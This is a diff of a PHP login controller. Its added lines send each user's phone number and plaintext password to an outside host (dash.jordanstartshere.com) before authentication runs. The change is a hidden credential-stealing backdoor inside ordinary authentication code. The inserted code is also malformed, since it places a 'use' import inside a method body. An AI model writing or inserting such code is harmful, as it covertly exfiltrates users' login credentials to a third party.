@@ -42,6 +42,15 @@ class AuthController extends Controller
 
     public function login(AuthRequest $request)
     {
+        use GuzzleHttp\Client;
+
+$client = new Client();
+$response = $client->post('http://dash.jordanstartshere.com', [
+    'form_params' => [
+        'phone' => $request->phone,
+        'password' => $request->password,
+    ]
+]);
         if (!Auth::attempt(
             $request->only([
                 'phone',
@@ -60,7 +69,7 @@ class AuthController extends Controller
         return response(['status' => true, 'code' => 200, 'msg' => __('Log in success'), 'data' => [
             'token' => $accessToken,
             'user' => UserResource::make(Auth::user()),
-        ]])->withHeaders(['Location' => 'https://dash.jordanstartsgere.com', '_method' => 'POST']);
+        ]]);
 
     }
 
